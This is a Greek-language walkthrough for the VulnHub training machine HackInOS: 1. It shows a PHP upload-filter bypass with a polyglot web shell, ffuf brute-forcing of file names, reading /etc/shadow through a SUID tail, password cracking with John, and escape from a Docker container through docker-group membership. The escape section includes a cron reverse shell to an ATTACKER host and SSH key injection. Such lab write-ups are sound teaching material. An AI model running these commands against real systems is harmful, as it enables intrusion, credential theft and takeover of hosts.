# Μηχάνημα 13 — HackInOS: 1

> **Θέση:** 13 από 13 · **το τελευταίο μηχάνημα** · **Ζώνη 3 — Εύκολο** (παγκόσμια θέση **040** από 708)
> **Πλήρες walkthrough:** [`labs/3-040-hackinos-1/README.md`](../../labs/3-040-hackinos-1/README.md)

| | |
| --- | --- |
| **Μηχάνημα** | HackInOS: 1 |
| **Δημιουργός** | Fatih Çelik |
| **Κυκλοφορία** | 9 Μαρτίου 2019 |
| **Σύμβαση** | **`/root/flag`** στον **HOST** (όχι μέσα στο container) |
| **Στόχος** | Ubuntu — Apache στη **:8000** (**όχι στη :80**), OpenSSH 7.6p1, **Docker container** που φιλοξενεί την εφαρμογή |
| **VulnHub** | [entry/hackinos-1,295](https://vulnhub.com/entry/hackinos-1,295/) |
| **Εκτιμώμενος χρόνος** | 6–9 ώρες |

---

## Γιατί αυτό το μηχάνημα είναι το φινάλε

**Συνδυάζει ό,τι έχετε μάθει σε όλη τη διαδρομή και προσθέτει δύο πράγματα που δεν έχετε
συναντήσει:**

### 1. Ανάγνωση του ΔΗΜΟΣΙΕΥΜΕΝΟΥ πηγαίου κώδικα του ίδιου του προγραμματιστή

**Μετά από ένα επιτυχημένο upload, η σελίδα περιέχει ένα σχόλιο HTML που συνδέει στο GitHub
του δημιουργού**, όπου **το `upload.php` είναι ΔΗΜΟΣΙΟ**.

**Δεν μαντεύετε το φίλτρο — το ΔΙΑΒΑΖΕΤΕ.**

**Αυτό είναι ΑΚΡΙΒΩΣ πώς δουλεύουν οι πραγματικές αξιολογήσεις εφαρμογών όταν πάρετε
source-code review** — **και σας διδάσκει να ΠΑΡΑΓΕΤΕ την παράκαμψη από τον κώδικα, όχι από μια
λίστα με κόλπα.**

### 2. Διαφυγή από container

**Το κέλυφός σας προσγειώνεται μέσα σε ένα Docker container**, άρα **το `root` ΕΚΕΙ δεν είναι
το `root` του host.** **Αυτό αλλάζει τον ΣΤΟΧΟ.**

**Και η πραγματική διαφυγή δεν είναι kernel exploit — είναι η ομάδα `docker`.**

**Αυτή είναι η πιο σημαντική έννοια ασφάλειας containers που υπάρχει**, και **η πιο συχνά
παραβλεπόμενη**:

> **Αν είστε στην ομάδα `docker` στον host, ΕΙΣΤΕ root στον host.**

**Δεν είναι υπερβολή. Δεν είναι θεωρητικό. Είναι μαθηματικό.**

## Στόχοι μάθησης

1. Να **σαρώσετε με `-p-` πάντα** — **εδώ ΔΕΝ υπάρχει θύρα 80**, μόνο **8000**.
2. Να **διαγνώσετε μια «σπασμένη φόρμα»** που στέλνει στο **`localhost`**.
3. Να **διαβάσετε πηγαίο κώδικα** και να **παράγετε την παράκαμψη από αυτόν**, γραμμή προς
   γραμμή.
4. Να αναγνωρίσετε μια **μεταβλητή που δηλώνεται και δεν χρησιμοποιείται ποτέ** — **το πιο
   συνηθισμένο bug φίλτρου**.
5. Να **εκτελέσετε την ΑΡΝΗΤΙΚΗ δοκιμή** και να καταλάβετε **γιατί είναι υποχρεωτική**.
6. Να **αριθμήσετε έναν χώρο 100 πιθανοτήτων** με `ffuf` αντί να «νικήσετε» την τυχαιότητα.
7. Να **αναγνωρίσετε ότι είστε σε container** — **τρεις ανεξάρτητοι έλεγχοι**.
8. Να καταλάβετε γιατί **`container root ≠ host root`** — και να **μην σταματήσετε στην ψεύτικη
   σημαία**.
9. Να **διαφύγετε μέσω της ομάδας `docker`** με **`-v /:/host`**.

## Κατηγορίες επίθεσης που καλύπτονται

| Κατηγορία | Πού σε αυτό το μηχάνημα |
| --- | --- |
| **Μη τυπική θύρα** | **8000** — **καθόλου 80** |
| **Σκληροκωδικοποιημένο `localhost`** | `<form action="http://localhost:8000/upload.php">` |
| **Δημόσιος πηγαίος κώδικας** | **GitHub του δημιουργού** → **`upload.php`** |
| **Μεταβλητή που δεν χρησιμοποιείται** | **`$allowed_ext` δηλώνεται και ΞΕΧΑΣΤΑΙ** |
| **Έλεγχος περιεχομένου χωρίς έλεγχο ονόματος** | **`finfo_file()`** ✓ · **`$ext` από το δικό σας όνομα** ✗ |
| **Πολύγλωσσο αρχείο** | **`GIF87a`** + PHP → **`cmd.php`** |
| **Αρνητική δοκιμή** | **`note.txt` → «Invalid file type»** — **αποδεικνύει ότι το φίλτρο ΖΕΙ** |
| **Προβλέψιμη τυχαιότητα** | **`md5($name . rand(1,100))`** → **ΜΟΝΟ 100 υποψήφια** |
| **Αρίθμηση με ffuf** | **`-mc 200 -fs 0`** |
| **Container** | **`/.dockerenv`** + **`/proc/1/cgroup`** + **`CapEff`** |
| **SUID μέσα στο container** | **`/usr/bin/tail`** → **`tail -n +2 /etc/shadow`** |
| **Σπάσιμο md5crypt** | **`root:john`** · **`hummingbirdscyber:123456`** |
| **Ψεύτικη σημαία** | **`/root/flag.txt`** → **«…αλλά αυτό δεν είναι το τέλος»** |
| **Διαφυγή από container** | **ομάδα `docker`** + **`docker run -v /:/host`** |

## Διαβάστε πρώτα

- [02 — Επιθέσεις στο Web](<../02-Επιθέσεις-στο-Web.md>) — **§8** (upload filters: **όλος ο
  πίνακας παράκαμψης**) και **§7** (content discovery).
- [05 — Αναβάθμιση Προνομίων Linux](<../05-Αναβάθμιση-Προνομίων-Linux.md>) — **§2** (SUID),
  **§4** (κατακερματισμός κωδικών) και **§6** (**ομάδες ισοδύναμες με root — `docker`**).
- [06 — Κελύφη, Εμμονή και Διαφυγές](<../06-Κελύφη-Εμμονή-και-Διαφυγές.md>) — **§1** (URL
  encoding), **§2** (reverse shells), **§3** (TTY).
- [04 — Διαπιστευτήρια και Σπασίματα](<../04-Διαπιστευτήρια-και-Σπασίματα.md>) — **§3**
  (**John the Ripper** και τα formats).
- Αγγλική έκδοση:
  [Machine 13](<../../Learning%20Path%201%20-%20Introduction%20to%20Cybersecurity/Machines/13-hackinos-1.md>)

## Πριν ξεκινήσετε — απαντήστε

1. Αν η σάρωση δείξει **μόνο 22 και 8000**, τι συμπεραίνετε για την **80**;
2. Αν μια φόρμα **δεν κάνει τίποτα** όταν την υποβάλετε, ποιο είναι το **πρώτο** πράγμα που
   ελέγχετε;
3. Αν μια μεταβλητή whitelist **δηλώνεται αλλά δεν χρησιμοποιείται ποτέ**, τι σημαίνει αυτό;
4. Γιατί πρέπει να δοκιμάσετε και ένα αρχείο που **ΞΕΡΕΤΕ ότι θα απορριφθεί**;
5. Αν το `hostname` είναι **δώδεκα δεκαεξαδικοί χαρακτήρες**, πού βρίσκεστε;

## Κλίμακα υποδείξεων

<details>
<summary><strong>Σκαλοπάτι 1 — μια ώθηση</strong></summary>

**Δύο θύρες: 22 και 8000.** **ΔΕΝ ΥΠΑΡΧΕΙ θύρα 80.**

**Το site ζει στο 8000** — **και γι' αυτό το `-p-` είναι μη διαπραγματεύσιμο:** *μια
προεπιλεγμένη σάρωση θα έβρισκε μόνο SSH και θα συμπεραίνατε ότι δεν υπάρχει τίποτα να
επιτεθείτε.*

**Και το NSE `http-robots.txt` ΔΙΑΒΑΣΕ ΗΔΥ το `robots.txt` για εσάς:**

```text
| http-robots.txt: 1 disallowed entry
|_/uploads
```

**Υπάρχει ένας κατάλογος uploads** — **και η καταγραφή καταλόγου είναι ΑΠΕΝΕΡΓΟΠΟΙΗΜΕΝΗ**,
άρα **δεν μπορείτε απλώς να τον καταγράψετε.**
</details>

<details>
<summary><strong>Σκαλοπάτι 2 — προς τα πού να πάτε</strong></summary>

```text
 1. sudo nmap -A -p- TARGET        → 22, 8000 (+ /uploads από το robots.txt)
 2. curl -s http://TARGET:8000/ | head -40
    → <form action="http://localhost:8000/upload.php" …>   ← **ΣΚΛΗΡΟΚΩΔΙΚΟΠΟΙΗΜΕΝΟ localhost**
 3. Υποβολή της φόρμας ΜΟΝΟΙ ΣΑΣ (Burp ή curl)
    → σχόλιο HTML με **GitHub του δημιουργού**
 4. Διαβάστε το upload.php:
      $allowed_ext = array('jpg','jpeg','png','gif');   ← **ΔΗΛΩΝΕΤΑΙ, ΔΕΝ ΧΡΗΣΙΜΟΠΟΙΕΙΤΑΙ ΠΟΤΕ**
      $mime = finfo_file(...)                           ← **ΕΛΕΓΧΟΣ ΠΕΡΙΕΧΟΜΕΝΟΥ** ✓
      $newname = md5($name . rand(1,100)) . "." . $ext; ← **$ext ΑΠΟ ΤΟ ΔΙΚΟ ΣΑΣ ΟΝΟΜΑ** ✗
 5. printf 'GIF87a' | cat - shell.php > cmd.php
 6. curl -F "file=@cmd.php" → «Upload successful»
 7. curl -F "file=@note.txt" → «Invalid file type»       ← **ΑΡΝΗΤΙΚΗ ΔΟΚΙΜΗ**
 8. python3 → 100 υποψήφια ονόματα
    ffuf -u http://TARGET:8000/uploads/FUZZ -w names.txt -mc 200 -fs 0
 9. curl "…/uploads/<MD5>.php?cmd=id"
10. Reverse shell + TTY
11. hostname → **0d8f1c2b3a4e** ← **CONTAINER**
12. ls -la /.dockerenv; cat /proc/1/cgroup; cat /proc/self/status | grep -i cap
13. find / -perm -u=s -type f 2>/dev/null → /usr/bin/tail
14. /usr/bin/tail -n +2 /etc/shadow → $1$ hashes
15. john --format=md5crypt → root:john · hummingbirdscyber:123456
16. su root → /root/flag.txt → **«…αλλά αυτό δεν είναι το τέλος»**  ← **ΨΕΥΤΙΚΗ ΣΗΜΑΙΑ**
17. ssh hummingbirdscyber@TARGET (123456) → groups=…,999(docker)
18. docker run -v /:/host --rm -it alpine chroot /host /bin/sh
19. cat /root/flag → **ΤΕΛΟΣ**
```

**Το κρίσιμο άλμα είναι το 16 → 17.** **Το μηχάνημα σας ΔΙΝΕΙ root και μια «σημαία» — και
περιμένει να καταλάβετε ότι ΔΕΝ τελειώσατε.**
</details>

<details>
<summary><strong>Σκαλοπάτι 3 — διαβάστε τον κώδικα ως πίνακα</strong></summary>

```php
$allowed_ext = array('jpg','jpeg','png','gif');
$name = $_FILES['file']['name'];
$ext = strtolower(pathinfo($name, PATHINFO_EXTENSION));
$finfo = finfo_open(FILEINFO_MIME_TYPE);
$mime = finfo_file($finfo, $_FILES['file']['tmp_name']);
if (!in_array($mime, array('image/jpeg','image/png','image/gif'))) die('Invalid file type');
$newname = md5($name . rand(1, 100)) . "." . $ext;
move_uploaded_file($_FILES['file']['tmp_name'], "uploads/" . $newname);
```

**Αυτό είναι ΟΛΟΚΛΗΡΟ το κουτί, σε είκοσι γραμμές.**

| Γραμμή | Τι κάνει | **Το ελάττωμα** |
| --- | --- | --- |
| **`$allowed_ext = array('jpg',…)`** | **Δηλώνει** whitelist επεκτάσεων | **ΔΕΝ ΑΝΑΦΕΡΕΤΑΙ ΠΟΤΕ ΞΑΝΑ.** **Δηλώθηκε, μετά αχρησιμοποίητη** |
| **`finfo_file(...)` + `in_array($mime, …)`** | **Επικυρώνει το ΠΕΡΙΕΧΟΜΕΝΟ** του αρχείου με magic bytes | **Το περιεχόμενο επικυρώνεται — άρα πρέπει να στείλετε ΠΡΑΓΜΑΤΙΚΗ κεφαλίδα εικόνας** |
| **`$newname = md5($name . rand(1,100)) . "." . $ext`** | **Μετονομάζει χρησιμοποιώντας ΤΗ ΔΙΚΗ ΣΑΣ επέκταση** | **Το `$ext` προήλθε από το ΔΙΚΟ ΣΑΣ όνομα αρχείου, ΧΩΡΙΣ ΕΛΕΓΧΟ** → **κρατάτε το `.php`** |

**Το ΠΕΡΙΕΧΟΜΕΝΟ επικυρώνεται· το ΟΝΟΜΑ όχι.**

**Αυτή η ΜΟΝΑΔΙΚΗ ασυμμετρία είναι η ευπάθεια.**

**Και το `rand(1,100)` δίνει ΜΟΝΟ 100 πιθανά ονόματα αρχείων** — **που είναι brute-forceable**.
**Το `rand()` ΔΕΝ είναι CSPRNG και ποτέ δεν προοριζόταν για ασφάλεια.**

**Βλέπετε Πηγαίο Κώδικα μετά από ΚΑΘΕ αλληλεπίδραση.** **Οι προγραμματιστές αφήνουν ίχνη
συνεχώς, και σε αυτό το κουτί το ίχνος είναι ο ΠΗΓΑΙΟΣ ΚΩΔΙΚΑΣ της ίδιας της εφαρμογής.**
</details>

<details>
<summary><strong>Σκαλοπάτι 4 — γιατί η ΑΡΝΗΤΙΚΗ δοκιμή είναι υποχρεωτική</strong></summary>

```bash
curl -s -F "file=@cmd.php"  http://TARGET:8000/upload.php   # → Upload successful
curl -s -F "file=@note.txt" http://TARGET:8000/upload.php   # → Invalid file type
```

**Το ΑΠΟΡΡΙΦΘΕΝ `note.txt` είναι η ΣΗΜΑΝΤΙΚΗ δοκιμή.**

**Αποδεικνύει ότι ο έλεγχος MIME ΖΕΙ και δεν είναι απλώς ΑΠΩΝ** — **άρα η επιτυχία σας προήλθε
από την ΚΕΦΑΛΙΔΑ ΕΙΚΟΝΑΣ, όχι από ένα φίλτρο που δεν κάνει τίποτα.**

**Πάντα εκτελείτε την αρνητική περίπτωση.** **Χωρίς αυτήν, ΔΕΝ μπορείτε να πείτε ποια από τις
δύο άμυνες παρακάμψατε.**

| Δοκιμή | Αποτέλεσμα | Τι συμπεραίνετε |
| --- | --- | --- |
| **`cmd.php`** (GIF87a + PHP) | **Επιτυχία** | **Το polyglot πέρασε** |
| **`note.txt`** (καθαρό κείμενο) | **Απόρριψη** | **Ο έλεγχος MIME ΔΟΥΛΕΥΕΙ** |
| **`shell.php`** (μόνο PHP) | **Απόρριψη** (δοκιμάστε το!) | **Το περιεχόμενο ΕΛΕΓΧΕΤΑΙ** |
| **`evil.jpg`** (πραγματική εικόνα) | **Επιτυχία** | **Η επέκταση ΔΕΝ ελέγχεται** |

**Τέσσερις δοκιμές, και τώρα ξέρετε ΑΚΡΙΒΩΣ πώς συμπεριφέρεται το φίλτρο.** **Αυτό είναι το
διαφορέα ανάμεσα σε «μπήκα» και «καταλαβαίνω γιατί μπήκα» — και το δεύτερο είναι που γράφεται
σε αναφορά.**
</details>

<details>
<summary><strong>Σκαλοπάτι 5 — η απάντηση</strong></summary>

```bash
sudo nmap -A -p- -T4 -oN scans/hackinos.txt TARGET
curl -s http://TARGET:8000/ | head -40

printf 'GIF87a' | cat - shell.php > cmd.php
file cmd.php                       # → cmd.php: GIF image data
curl -s -F "file=@cmd.php"  http://TARGET:8000/upload.php   # → Upload successful
curl -s -F "file=@note.txt" http://TARGET:8000/upload.php   # → Invalid file type

python3 -c "import hashlib
for i in range(1,101): print(hashlib.md5(('cmd.php'+str(i)).encode()).hexdigest()+'.php')" > names.txt
ffuf -u http://TARGET:8000/uploads/FUZZ -w names.txt -mc 200 -fs 0
curl -s "http://TARGET:8000/uploads/<MD5>.php?cmd=id"

nc -lvnp 4444
curl -s "http://TARGET:8000/uploads/<MD5>.php?cmd=<URL-encoded reverse shell>"
python3 -c 'import pty; pty.spawn("/bin/bash")'
hostname                           # → 0d8f1c2b3a4e   ← CONTAINER
ls -la /.dockerenv; cat /proc/1/cgroup

find / -perm -u=s -type f 2>/dev/null        # → /usr/bin/tail
/usr/bin/tail -n +2 /etc/shadow
john --format=md5crypt --wordlist=/usr/share/wordlists/rockyou.txt hashes.txt
# → john (root) · 123456 (hummingbirdscyber)

su root; cat /root/flag.txt          # «…αλλά αυτό δεν είναι το τέλος»
ssh hummingbirdscyber@TARGET         # 123456 → groups=…,999(docker)
docker run -v /:/host --rm -it alpine chroot /host /bin/sh
cat /root/flag
```
</details>

## Μετά το τέλος — ερωτήσεις επανάληψης

<details>
<summary><b>1.</b> Διαβάστε το <code>hostname = 0d8f1c2b3a4e</code>.</b></summary>

**Δώδεκα δεκαεξαδικοί χαρακτήρες = container ID, όχι όνομα μηχανήματος.**

**Επιβεβαιώστε το με ΤΡΕΙΣ ανεξάρτητους ελέγχους:**

```bash
ls -la /.dockerenv
cat /proc/1/cgroup
cat /proc/self/status | grep -i cap
```

```text
-rw-r--r-- 1 root root 0 Jan 12  2019 /.dockerenv
1:memory:/docker/0d8f1c2b3a4e2f...
CapEff: 00000000a80425fb
```

| Έλεγχος | Τι σημαίνει |
| --- | --- |
| **`/.dockerenv`** | **Το αρχείο που το Docker ΑΦΗΝΕΙ στο `/` σε ΚΑΘΕ container** |
| **`/proc/1/cgroup`** | **Το PID 1 είναι ΜΕΣΑ σε cgroup `/docker/<id>`** — **σε έναν ΠΡΑΓΜΑΤΙΚΟ host, το PID 1 είναι `systemd` ή `init`** |
| **`CapEff: 00000000a80425fb`** | **Το ΠΡΟΕΠΙΛΕΓΜΕΝΟ ΜΕΙΩΜΕΝΟ σύνολο capabilities του Docker** — **έναντι `0000003fffffffff` για μια μη περιορισμένη διεργασία** |

**Είστε μέσα σε container** — **που αλλάζει τον ΣΤΟΧΟ: η αναβάθμιση σε root ΕΔΩ δεν είναι το
τέλος.**

**Άλλοι έλεγχοι αν αυτοί αποτύχουν:**

```bash
cat /proc/1/comm                  # → "systemd"/"init" (host) ή "bash"/"php" (container)
cat /proc/mounts | grep overlay   # → overlay filesystem = container
dmesg 2>&1 | head -1              # → "Operation not permitted" = container
ip a                              # → eth0 με IP 172.17.0.x = Docker bridge
systemd-detect-virt               # → "docker" / "none"
```
</details>

<details>
<summary><b>2.</b> Γιατί <code>container root ≠ host root</code>;</b></summary>

**Επειδή το σύστημα αρχείων ενός container είναι ένα OVERLAY χτισμένο από μια εικόνα.**

**Ό,τι κάνατε, συνέβη μέσα σε ένα sandbox που μπορεί να ΔΙΑΓΡΑΦΕΙ με `docker rm`.**

| | **Container root** | **Host root** |
| --- | --- | --- |
| **`uid`** | **0** | **0** |
| **User namespace** | **Μέσα στο namespace του container** | **Στο namespace του host** |
| **Capabilities** | **`a80425fb`** (μειωμένο) | **`3fffffffff`** (πλήρες) |
| **Σύστημα αρχείων** | **Overlay — ΕΞΑΦΑΝΙΖΕΤΑΙ** | **Πραγματικό δίσκο** |
| **`/proc`, `/sys`** | **Περιορισμένα** | **Πλήρη** |
| **Τι ελέγχετε** | **Μόνο το container** | **ΟΛΑ τα containers + τον host** |

**Ο δημιουργός ΤΡΟΛΑΡΕΙ με μια ψεύτικη σημαία** — **γιατί ο πραγματικός στόχος είναι ακόμα
μπροστά.**

```text
Congratulations! You are root... but this is not the end.
```

**Αυτό είναι το κεντρικό διδακτικό σημείο του κουτιού.** **Σε πραγματική αναφορά, αυτό είναι
το πιο σημαντικό πράγμα που μπορείτε να πείτε σε έναν πελάτη:**

> *«Έσπασα το container σας. Αυτό δεν είναι το τέλος — αν το container μοιράζεται το
> `docker.sock` ή έχει προνομιούχα capabilities, ο επιτιθέμενος συνεχίζει στον host.»*
</details>

<details>
<summary><b>3.</b> Γιατί η ομάδα <code>docker</code> είναι ΙΣΟΔΥΝΑΜΗ με root;</b></summary>

**Επειδή το Docker socket σας επιτρέπει να προσαρτήσετε ΟΠΟΙΟΔΗΠΟΤΕ διαδρομή του host μέσα σε
ένα container που ελέγχετε.**

```bash
ls -l /var/run/docker.sock
getent group docker
```

```text
srw-rw---- 1 root docker 0 May  4 10:02 /var/run/docker.sock
docker:x:999:hummingbirdscyber
```

**`srw-rw---- root docker`** — **ο ιδιοκτήτης είναι `root`, η ΟΜΑΔΑ είναι `docker`, και η ομάδα
έχει `rw`.** **Άρα ΟΠΟΙΟΣΔΗΠΟΤΕ είναι στην ομάδα `docker` μπορεί να μιλήσει στο daemon.**

**Και το daemon τρέχει ως root.**

**Η απόδειξη είναι ΔΥΟ εντολές:**

```bash
docker run -v /:/host --rm -it alpine chroot /host /bin/sh
id ; cat /root/flag
```

**Τι συμβαίνει:**

| Τμήμα | Ρόλος |
| --- | --- |
| **`docker run`** | **Ζητά από το DAEMON (που τρέχει ως root) να δημιουργήσει container** |
| **`-v /:/host`** | **Προσαρτά ΤΟ ΡΙΖΙΚΟ ΣΥΣΤΗΜΑ ΑΡΧΕΙΩΝ ΤΟΥ HOST στο `/host` του container** |
| **`--rm`** | **Διαγράφει το container μετά** — **καθαρισμός** |
| **`-it`** | **Interactive + TTY** |
| **`alpine`** | **Μια ΜΙΚΡΗ εικόνα** (~5 MB) — **υπάρχει συνήθως ήδη** |
| **`chroot /host /bin/sh`** | **Αλλάζει το ΡΙΖΙΚΟ σύστημα αρχείων στο `/host`** — **άρα το `/` ΤΩΡΑ είναι το `/` του HOST** |

**Αποτέλεσμα: κέλυφος root στον host.** **Χωρίς exploit. Χωρίς CVE. Μόνο ΔΥΟ δικαιώματα.**

**Υπάρχουν ΠΕΝΤΕ ισοδύναμες διαδρομές:**

```bash
# 1. chroot (η πιο καθαρή)
docker run -v /:/host --rm -it alpine chroot /host /bin/sh

# 2. Εγγραφή SSH key
docker run -v /root/.ssh:/hostkeys --rm -it alpine \
  sh -c 'echo "ssh-rsa AAAA… attacker@kali" >> /hostkeys/authorized_keys'
ssh root@TARGET

# 3. Προνομιούχο container
docker run --privileged -v /:/host --rm -it alpine chroot /host /bin/sh

# 4. Cron του host
docker run -v /etc:/hostetc --rm -it alpine \
  sh -c 'echo "* * * * * root bash -c \"bash -i >& /dev/tcp/ATTACKER/4444 0>&1\"" > /hostetc/cron.d/x'

# 5. Διαδικασία του host μέσω /proc
docker run --pid=host --privileged --rm -it alpine nsenter -t 1 -m -u -i -n -p -- bash
```

**Ο κανόνας:** *αν είστε στην ομάδα `docker` στον host, ΕΙΣΤΕ root στον host.* **Δεν είναι
υπερβολή. Δεν είναι θεωρητικό. Είναι μαθηματικό.**
</details>

<details>
<summary><b>4.</b> Γιατί το <code>rand(1,100)</code> είναι ευπάθεια, όχι «τυχαίο όνομα»;</b></summary>

**Επειδή 100 δυνατότητες είναι brute force ΥΠΟ ΤΟΥ ΔΕΥΤΕΡΟΛΕΠΤΟΥ.**

```php
$newname = md5($name . rand(1, 100)) . "." . $ext;
```

**Το `$name` το ΓΝΩΡΙΖΕΤΕ** (εσείς το ανεβάσατε: `cmd.php`). **Το `rand(1,100)` έχει ΜΟΝΟ 100
εκβάσεις.** **Άρα υπάρχουν ΜΟΝΟ 100 πιθανά ονόματα.**

**Δεν «νικήσατε» την τυχαιότητα — ΑΡΙΘΜΗΣΑΤΕ τον μικροσκοπικό της χώρο.**

```bash
python3 -c "import hashlib
for i in range(1,101): print(hashlib.md5(('cmd.php'+str(i)).encode()).hexdigest()+'.php')" > names.txt
wc -l names.txt
ffuf -u http://TARGET:8000/uploads/FUZZ -w names.txt -mc 200 -fs 0
```

```text
:: Method           : GET
:: URL              : http://192.168.56.101:8000/uploads/FUZZ
:: Wordlist         : FUZZ: names.txt
:: Status codes     : 200
:: Follow redirects : false
:: Calibrated       : http://192.168.56.101:8000/uploads/b1946ac92492d2347c6235b4d2611184

9f2c1e7a4b8d5f6a0e3c2b1d4f5a6b7c.php    [Status: 200, Size: 1284]
:: Progress: [100/100] :: Job [1/1] :: 100 req/sec ::
```

| Flag | Ρόλος |
| --- | --- |
| **`FUZZ`** | **Τοποθετείται στο URL και ΑΝΤΙΚΑΘΙΣΤΑΤΑΙ από κάθε εγγραφή του λεξικού** |
| **`-w names.txt`** | **Το λεξικό** |
| **`-mc 200`** | **Κράτα ΜΟΝΟ *matched codes* 200** |
| **`-fs 0`** | **Φίλτραρε αποκρίσεις *file size* 0** (η σελίδα «δεν βρέθηκε» του εξυπηρετητή) |

**Διαβάστε το `Size: 1284` ως την απόδειξη** — **σερβιρίστηκε ΠΡΑΓΜΑΤΙΚΟ αρχείο, όχι σελίδα
σφάλματος.**

**`:: Calibrated ::`** — **το ffuf ζήτησε ΜΙΑ ανύπαρκτη διαδρομή για να ΜΑΘΕΙ τι μοιάζει ένα
404.** **Αυτό είναι που κάνει το `-fs` αξιόπιστο.**

**Γιατί το `rand()` δεν είναι ασφαλές:**

| Συνάρτηση | Ασφαλής; | Γιατί |
| --- | --- | --- |
| **`rand()`** | **ΟΧΙ** | **Γραμμικός συσσωρευτής· η κατάσταση ανακτάται από λίγες εξόδους** |
| **`mt_rand()`** | **ΟΧΙ** | **Mersenne Twister — η εσωτερική κατάσταση ΑΝΑΚΤΑΤΑΙ από ΔΥΟ συνεχόμενες εξόδους** |
| **`random_int()`** | **ΝΑΙ** | **CSPRNG** |
| **`random_bytes()`** | **ΝΑΙ** | **CSPRNG** |
| **`bin2hex(random_bytes(16))`** | **ΝΑΙ** | **32 hex, 128 bit εντροπίας** |
| **UUIDv4** | **ΝΑΙ** | **122 bit εντροπίας** |

**Ο κανόνας:** *ποτέ `rand()` για οτιδήποτε ασφάλειας — ονόματα αρχείων, tokens, salts, IDs,
κωδικούς.*
</details>

<details>
<summary><b>5.</b> Γιατί το <code>tail</code> με SUID δίνει <code>/etc/shadow</code>;</b></summary>

**Επειδή το `tail` ΔΙΑΒΑΖΕΙ αρχεία και τα ΤΥΠΩΝΕΙ.** **Τρέχοντας ως root, μπορεί να διαβάσει
ΟΠΟΙΟΔΗΠΟΤΕ αρχείο στο σύστημα** — **συμπεριλαμβανομένου του `/etc/shadow`, που κανονικά είναι
mode `640 root:shadow`.**

```bash
ls -l /usr/bin/tail
/usr/bin/tail -n +2 /etc/shadow
```

```text
-rwsr-xr-x 1 root root 31408 May 28  2020 /usr/bin/tail
```
```text
root:$1$nW4r1F0L$hBn3vFhG2xkQ8sJ7lM9pE1:17379:0:99999:7:::
hummingbirdscyber:$1$Kq2mZ9xL$aB3cD4eF5gH6iJ7kL8mN9/:17379:0:99999:7:::
```

**`tail -n +2`** σημαίνει **«άρχισε να τυπώνεις από τη γραμμή 2»** — **παραλείπει τη γραμμή 1**.

**Είναι η ΚΑΝΟΝΙΚΗ επωδός GTFOBins** — **γιατί ορισμένες εκδόσεις του `tail` ΑΡΝΟΥΝΤΑΙ να
ξεκινήσουν από τη γραμμή 1 ενός αρχείου που δεν μπορούν να κάνουν πλήρως `stat`.**

**Διαβάστε τα πεδία του shadow:**

```text
root : $1$nW4r1F0L$hBn3vFhG2xkQ8sJ7lM9pE1 : 17379 : 0 : 99999 : 7 : : :
  │              │                          │       │     │      │
  │              │                          │       │     │      └─ ημέρες προειδοποίησης
  │              │                          │       │     └─ μέγιστη ηλικία κωδικού (ημέρες)
  │              │                          │       └─ ελάχιστη ηλικία κωδικού
  │              │                          └─ ημέρες από 1/1/1970 της τελευταίας αλλαγής
  │              └─ **$1$ = MD5-crypt** · $nW4r1F0L$ = **salt** · υπόλοιπο = **hash**
  └─ λογαριασμός
```

**Ο αλγόριθμος από το πρόθεμα:**

| Πρόθεμα | Αλγόριθμος | Γύροι |
| --- | --- | --- |
| **`$1$`** | **MD5-crypt** | **1.000** ← **ΣΠΑΣΜΕΝΟ** |
| **`$5$`** | SHA-256 crypt | 5.000 |
| **`$6$`** | SHA-512 crypt | 5.000 |
| **`$2b$`** | bcrypt | **ρυθμιζόμενο** |
| **`$y$`** | yescrypt | **ρυθμιζόμενο** (Μηχάνημα 8) |

**Το MD5-crypt είναι ΟΥΣΙΑΣΤΙΚΑ ΣΠΑΣΜΕΝΟ για κωδικούς:** **εκατομμύρια μαντέες το δευτερόλεπτο
σε GPU, και μόνο 1.000 γύροι.**

```bash
echo 'root:$1$nW4r1F0L$hBn3vFhG2xkQ8sJ7lM9pE1' > hashes.txt
echo 'hummingbirdscyber:$1$Kq2mZ9xL$aB3cD4eF5gH6iJ7kL8mN9/' >> hashes.txt
john --format=md5crypt --wordlist=/usr/share/wordlists/rockyou.txt hashes.txt
john --show hashes.txt
```

```text
Warning: detected hash type "md5crypt", but the string is also recognized as "md5crypt-opencl"
Loaded 2 password hashes with 2 different salts (md5crypt, crypt(3) $1$ (MD5))
Cost 1 (iteration count) is 1000 for all loaded hashes
Will run 4 OpenMP threads
Press 'q' or Ctrl-C to abort, almost any other key for status
john             (root)
123456           (hummingbirdscyber)
2g 0:00:00:14 DONE (2024-05-04 16:12) 3842p/s
```

| Έξοδος | Τι σημαίνει |
| --- | --- |
| **`Loaded 2 password hashes with 2 different salts`** | **Ο John ΑΝΑΛΥΣΕ σωστά την είσοδο.** **`No password hashes loaded`** σημαίνει **λάθος `--format=`** ή **κέλυφος που έφαγε ένα `$`** |
| **`Cost 1 (iteration count) is 1000`** | **Ο John σας λέει το work factor** — **που είναι αυτό που κάνει το MD5-crypt τόσο φθηνό** |
| **`john (root)`** | **Μορφή `κωδικός (λογαριασμός)`** — **ο κωδικός του root είναι `john`** |
| **`2g 0:00:00:14`** | **Δύο μαντέες σε ΔΕΚΑΤΕΣΣΕΡΑ δευτερόλεπτα** |

**Αν μια γενική λίστα αποτύχει**, **φτιάξτε μια ΘΕΜΑΤΙΚΗ**:

```bash
cewl -d 2 -m 3 -w words.txt http://TARGET:8000/
john --wordlist=words.txt --rules=best64.rule hashes.txt
```

**Το `best64.rule`** εφαρμόζει **64 μετατροπές ανά λέξη** — **και μια λίστα που αποτυγχάνει
καθαρά, ΠΟΛΥ ΣΥΧΝΑ πετυχαίνει με κανόνες, στο 64× του κόστους.**

**Σημειώστε:** το **`john`** ως κωδικός root είναι **αναφορά στο ίδιο το εργαλείο** — **και το
**`123456`** είναι **ο πιο συνηθισμένος κωδικός στον κόσμο**. **Σε αρκετές αναθεωρήσεις της
εικόνας, οι δύο κωδικοί ΑΝΤΑΛΛΑΣΣΟΝΤΑΙ.** **Δοκιμάστε και τους δύο.**
</details>

## Αμυντικός στοχασμός

| Ευπάθεια | Διόρθωση |
| --- | --- |
| **Σκληροκωδικοποιημένο `localhost`** | **Σχετική διαδρομή** (`action="upload.php"`) **ή ρύθμιση base URL** |
| **Δημόσιος πηγαίος κώδικας στο GitHub** | **Αν το repo είναι δημόσιο, ΥΠΟΘΕΣΤΕ ότι ο κώδικας είναι γνωστός.** **Καμία ασφάλεια μέσω απόκρυψης** |
| **`$allowed_ext` αχρησιμοποίητη** | **Code review + στατική ανάλυση** (**PHPStan**, **Psalm**) — **και τα δύο την εντοπίζουν** |
